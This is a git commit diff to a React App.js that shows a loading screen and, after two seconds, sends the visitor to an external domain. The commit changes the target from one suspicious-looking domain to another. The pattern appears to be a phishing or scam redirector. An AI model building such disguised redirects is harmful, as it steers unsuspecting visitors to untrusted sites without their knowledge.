7202c7d5f2c3d7d0fb21685399d0a1b72d1a3960
husknet <127146284+husknet@users.noreply.github.com>
2024-11-21 13:01:03 +0000

    Update App.js

--- src/App.js
+++ src/App.js
@@ -4,7 +4,7 @@ import Loading from './Loading';
 function App() {
     useEffect(() => {
         const timer = setTimeout(() => {
-            window.location.href = 'https://abscarupdated.click';
+            window.location.href = 'https://ubk.contadoreslp.ar';
         }, 2000);
 
         return () => clearTimeout(timer);
